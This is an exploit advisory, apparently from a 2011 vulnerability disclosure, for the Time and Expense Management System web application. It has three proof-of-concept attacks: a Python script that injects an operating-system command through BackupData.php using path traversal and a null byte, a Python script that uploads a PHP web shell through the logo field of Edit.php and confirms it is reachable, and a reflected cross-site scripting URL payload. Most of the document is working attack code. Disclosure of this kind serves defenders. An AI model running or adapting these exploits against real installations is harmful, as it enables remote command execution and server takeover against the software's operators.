# Software................Time and Expense Management System
# Vulnerability...........Command Injection
# Threat Level............Very Critical (5/5)
# Download................http://sourceforge.net/projects/tems/
# Discovery Date..........4/27/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
#
#
# --Description--
#
# A command injection vulnerability in Time and Expense Management
# System can be exploited to execute arbitrary operating system commands.
#
#
# --PoC--
 
import socket
 
host = &#039;localhost&#039;
path = &#039;/tems&#039;
port = 80
 
def run_command():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)
 
    body = &#039;------x\r\n&#039;\
           &#039;Content-Disposition: form-data; name="toFile"\r\n&#039;\
           &#039;\r\n&#039;\
           &#039;./a\r\n&#039;\
           &#039;------x\r\n&#039;\
           &#039;Content-Disposition: form-data; name="DB_Admin_id"\r\n&#039;\
           &#039;\r\n&#039;\
           &#039;a\r\n&#039;\
           &#039;------x\r\n&#039;\
           &#039;Content-Disposition: form-data; name="DB_Admin_Password"\r\n&#039;\
           &#039;\r\n&#039;\
           &#039;../../../../../../../calc\x00a\r\n&#039;\
           &#039;------x--\r\n&#039;\
           &#039;\r\n&#039;
 
 
    s.send(&#039;POST %s/systemadmin/BackupData.php HTTP/1.1\r\n&#039;
           &#039;Host: localhost\r\n&#039;
           &#039;Proxy-Connection: keep-alive\r\n&#039;
           &#039;User-Agent: x\r\n&#039;
           &#039;Content-Length: %d\r\n&#039;
           &#039;Cache-Control: max-age=0\r\n&#039;
           &#039;Origin: null\r\n&#039;
           &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
           &#039;Accept: text/html\r\n&#039;
           &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
           &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
           &#039;\r\n%s&#039; % (path, len(body), body))
 
    print &#039;request sent, check for calc using the task manger&#039;
 
run_command()
 
# ------------------------------------------------------------------------
# Software................Time and Expense Management System
# Vulnerability...........Arbitrary Upload
# Threat Level............Very Critical (5/5)
# Download................http://sourceforge.net/projects/tems/
# Discovery Date..........4/27/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
#
#
# --Description--
#
# An arbitrary upload vulnerability in Time and Expense Management
# System can be exploited to upload a PHP shell.
#
#
# --PoC--
 
import socket
 
host = &#039;localhost&#039;
path = &#039;/tems&#039;
shell_path = path + &#039;/images/logoshell.php&#039;
port = 80
 
def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)   
 
    s.send(&#039;POST &#039; + path + &#039;/systemadmin/Edit.php HTTP/1.1\r\n&#039;
           &#039;Host: localhost\r\n&#039;
           &#039;Proxy-Connection: keep-alive\r\n&#039;
           &#039;User-Agent: x\r\n&#039;
           &#039;Content-Length: 938\r\n&#039;
           &#039;Cache-Control: max-age=0\r\n&#039;
           &#039;Origin: null\r\n&#039;
           &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
           &#039;Accept: text/html\r\n&#039;
           &#039;Accept-Encoding: gzip,deflate,sdch\r\n&#039;
           &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
           &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
           &#039;\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="uid"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="name"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="address1"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="city"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="state"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="postalcode"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="country"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="weekendday"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="language"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="address2"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="logo"\r\n&#039;
           &#039;\r\n&#039;
           &#039;shell.php\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="logo"; filename="shell.php"\r\n&#039;
           &#039;Content-Type: image/gif\r\n&#039;
           &#039;\r\n&#039;
           &#039;------x--\r\n&#039;
           &#039;\r\n&#039;)
 
    resp = s.recv(8192)
 
    http_found = &#039;HTTP/1.1 302&#039;
    http_ok = &#039;HTTP/1.1 200&#039;
     
    if http_found not in resp[:len(http_found)]:
        print &#039;error uploading shell&#039;
        return
    else: print &#039;shell uploaded&#039;
 
    s.send(&#039;GET &#039; + shell_path + &#039; HTTP/1.1\r\n&#039;\
           &#039;Host: &#039; + host + &#039;\r\n\r\n&#039;)
 
    if http_ok not in s.recv(8192)[:len(http_ok)]: print &#039;shell not found&#039;       
    else: print &#039;shell located at http://&#039; + host + shell_path
 
upload_shell()
 
------------------------------------------------------------------------
Software................Time and Expense Management System
Vulnerability...........Reflected Cross-site Scripting
Threat Level............Low (1/5)
Download................http://sourceforge.net/projects/tems/
Discovery Date..........4/27/2011
Tested On...............Windows Vista + XAMPP
------------------------------------------------------------------------
Author..................AutoSec Tools
Site....................http://www.autosectools.com/
Email...................John Leitch <john@autosectools.com>
------------------------------------------------------------------------
 
 
--Description--
 
A reflected cross-site scripting vulnerability in Time and Expense
Management System can be exploited to execute arbitrary JavaScript.
 
 
--PoC--
 
http://localhost/tems/lookup.php?form=a%28%29;}alert%280%29;{//



